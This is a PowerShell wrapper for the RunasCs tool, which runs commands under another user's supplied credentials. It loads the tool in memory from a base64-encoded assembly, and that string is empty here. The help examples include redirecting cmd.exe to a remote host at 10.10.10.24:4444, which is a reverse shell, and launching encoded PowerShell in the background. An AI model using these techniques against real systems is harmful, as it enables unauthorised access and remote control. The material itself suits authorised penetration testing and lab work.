<#
RunasCs is an utility to run specific processes with different permissions
than the user's current logon provides using explicit credentials.
Author: @splinter_code
License: GPL-3.0
Source: https://github.com/antonioCoco/RunasCs
#>

#Requires -Version 2

function Invoke-RunasCs
{   
    <#
        .SYNOPSIS
            RunasCs - Csharp and open version of windows builtin runas.exe 
            
        .PARAMETER Username
            The username of the user
        .PARAMETER Password
            The password of the user
        .PARAMETER Command
            A command supported by cmd.exe if ProcessTimeout>0
            The commandline for the process if ProcessTimeout=0
        .PARAMETER Domain
            The  domain of the user, if in a domain.
            Default: ""
        .PARAMETER ProcessTimeout
            The waiting time (in ms) for the created process.
            This will halt powershell until the spawned
            process ends and sent the output back to the caller.
            If you set 0 no output will be retrieved and cmd.exe
            won't be used to spawn the process.
            Default: "120000"
        .PARAMETER LogonType
            The logon type for the spawned process.
            Default: "3"
        .PARAMETER CreateProcessFunction
            The CreateProcess function to use.
            0: CreateProcessAsUser
            1: CreateProcessWithTokenW
            2: CreateProcessWithLogonW
            Default: RunasCs selects an appropriate
            CreateProcess function automatically
            according to your privileges.
        .PARAMETER Remote
            Remote host in host:port format.
            Stdin, stdout and stderr will be redirected
            to the specified host. The process timeout
            will be set to 0 if not specified explicitly.

        .EXAMPLE  
            Run a command as a specific local user
                Invoke-RunasCs user1 password1 whoami
        .EXAMPLE
            Run a command as a specific domain user
                Invoke-RunasCs -Domain domain1 -Username user1 -Password password1 -Command whoami
        .EXAMPLE
            Run a command as a specific local user with interactive logon type (2)
                Invoke-RunasCs -Username user1 -Password password1 -Command whoami -LogonType 2
        .EXAMPLE
            Run a background/async process as a specific local user,
                Invoke-RunasCs -Username user1 -Password password1 -ProcessTimeout 0 -Command "%COMSPEC% powershell -enc..."
        .EXAMPLE
            Redirect stdin, stdout and stderr of the specified command to a remote host
                Invoke-RunasCs -Username user1 -Password password1 -Command cmd.exe -Remote 10.10.10.24:4444
    #>
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $Username,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Password,
        
        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Command,

        [Parameter()]
        [String]
        $Domain = "",

        [Parameter()]
        [String]
        $ProcessTimeout = "120000",

        [Parameter()]
        [String]
        $LogonType = "3",

        [Parameter()]
        [String]
        $CreateProcessFunction,

        [Parameter()]
        [String]
        $Remote
    )

    $parametersRunasCs = New-Object Collections.Generic.List[string]
    $parametersRunasCs.add($Username)
    $parametersRunasCs.add($Password)
    $parametersRunasCs.add($Command)
    $parametersRunasCs.add("-d")
    $parametersRunasCs.add($Domain)
    $parametersRunasCs.add("-l")
    $parametersRunasCs.add($LogonType)
    $parametersRunasCs.add("-t")
    $parametersRunasCs.add($ProcessTimeout)

    if( $PSBoundParameters.ContainsKey('CreateProcessFunction') ) {
        $parametersRunasCs.add("-f")
        $parametersRunasCs.add($CreateProcessFunction)
    }

    if( $PSBoundParameters.ContainsKey('Remote') ) {
        $parametersRunasCs.add("-r")
        $parametersRunasCs.add($Remote)
    }

    $RunasCsBase64 = ""
    $RunasCsBytes = [System.Convert]::FromBase64String($RunasCsBase64)
    [Reflection.Assembly]::Load($RunasCsBytes) | Out-Null

    $output = [RunasCsMainClass]::RunasCsMain($parametersRunasCs.ToArray())
    Write-Output $output
}
